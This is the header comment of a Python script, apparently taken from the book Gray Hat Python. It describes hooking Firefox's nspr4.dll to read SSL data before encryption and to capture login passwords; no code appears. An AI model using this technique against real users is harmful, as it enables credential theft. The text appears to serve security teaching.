'''
Example taken from Gray Hat Python (book)
This script present a way to hook a DLL library in Firefox. For this example the script hook nspr4.dll which encrypt datas for SSL connection.

So we will be able to get the text before it is encrypted. Moreover we catch a pattern "password" to get all login/password before they are ciphered.

Taken from: https://gist.github.com/RobinDavid/9213868
Tested with Firefox 3.5 (new versions use different libraries)
